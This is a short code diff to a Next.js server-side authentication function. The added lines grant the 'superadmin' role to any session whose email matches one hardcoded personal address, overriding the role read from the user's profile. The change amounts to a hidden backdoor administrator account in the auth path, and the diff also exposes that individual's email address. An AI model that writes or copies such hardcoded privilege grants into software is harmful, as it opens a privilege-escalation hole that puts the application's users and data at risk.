@@ -53,6 +53,10 @@ export async function getAuthenticatedUser(req: NextRequest): Promise<Authentica
             console.warn('Erreur récupération profil dans serverAuth:', e);
           }
 
+          if (data.user.email === 'fayethierno7@gmail.com') {
+            verifiedRole = 'superadmin';
+          }
+
           return {
             id: data.user.id,
             email: data.user.email,
